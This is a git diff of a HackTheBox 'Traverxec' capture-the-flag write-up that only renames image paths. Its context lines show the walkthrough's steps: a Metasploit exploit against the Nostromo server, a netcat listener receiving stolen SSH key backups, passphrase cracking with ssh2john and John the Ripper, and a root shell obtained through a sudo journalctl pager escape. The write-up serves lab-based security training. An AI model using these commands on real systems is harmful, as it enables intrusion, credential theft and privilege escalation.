@@ -8,7 +8,7 @@ mathjax: "true"
 ---
 
 
-<img src="/images/Traverxec-Writeup/Traverxec.png" style="display: block; margin: auto;" />
+<img src="/images/Traverxec/Traverxec.png" style="display: block; margin: auto;" />
 
 # Scanning
 
@@ -95,11 +95,11 @@ Exploit target:
 
 Set the module options (remote host, local host) then run the exploit.
 
-<img src="/images/Traverxec-Writeup/1.png" style="display: block; margin: auto;" />
+<img src="/images/Traverxec/1.png" style="display: block; margin: auto;" />
 
 After while, we find the user “david” under the (/home) directory, but its appear that we need a special permission to list the content of that directory.
 
-<img src="/images/Traverxec-Writeup/2.png" style="display: block; margin: auto;" />
+<img src="/images/Traverxec/2.png" style="display: block; margin: auto;" />
 
 
 If we look at the configuration server path (/var/nostromo/conf), we could find a file called “nhttpd.conf”, and from it’s name we can guess that is the web server configuration file.
@@ -161,7 +161,7 @@ nc -l -p <port> > backup-ssh-identity-files.tgz //in your machine
 
 ```
 
-<img src="/images/Traverxec-Writeup/3.png" style="display: block; margin: auto;" />
+<img src="/images/Traverxec/3.png" style="display: block; margin: auto;" />
 
 ``` bash
 root@kali:~/Desktop/HackTheBox/Traverxec# tar xvzf backup-ssh-identity-files.tgz
@@ -184,7 +184,7 @@ A passphrase is needed to access the machine. We will try to crack it by JohnThe
 /usr/share/john/ssh2john.py <Private_Key> > Hash_File
 ```
 
-<img src="/images/Traverxec-Writeup/4.png" style="display: block; margin: auto;" />
+<img src="/images/Traverxec/4.png" style="display: block; margin: auto;" />
 
 Now we will use JohnTheRipper tool to crack the converted hash.
 
@@ -207,7 +207,7 @@ Proceeding with incremental:ASCII
 Session aborted
 ```
 
-<img src="/images/Traverxec-Writeup/5.png" style="display: block; margin: auto;" />
+<img src="/images/Traverxec/5.png" style="display: block; margin: auto;" />
 
 # Root
 
@@ -250,15 +250,15 @@ It will display the last 5 line of the log normally. But if we execute it withou
 /usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service
 ```
 
-<img src="/images/Traverxec-Writeup/6.png" style="display: block; margin: auto;" />
+<img src="/images/Traverxec/6.png" style="display: block; margin: auto;" />
 
 The log will be displayed in Vim terminal that will be run with root permission, which we can take advantage of it by escalating the privilege to root. Looking into GTFOBins page https://gtfobins.github.io/gtfobins/systemctl/, we found an interesting way to escalate privileges to root.
 
 Simply, execute “!/bin/bash” at the bottom of the terminal, as it will be executed as root to get root bash terminal.
 
-<img src="/images/Traverxec-Writeup/7.png" style="display: block; margin: auto;" />
+<img src="/images/Traverxec/7.png" style="display: block; margin: auto;" />
 
 And we got root!
 
-<img src="/images/Traverxec-Writeup/8.png" style="display: block; margin: auto;" />
+<img src="/images/Traverxec/8.png" style="display: block; margin: auto;" />
 
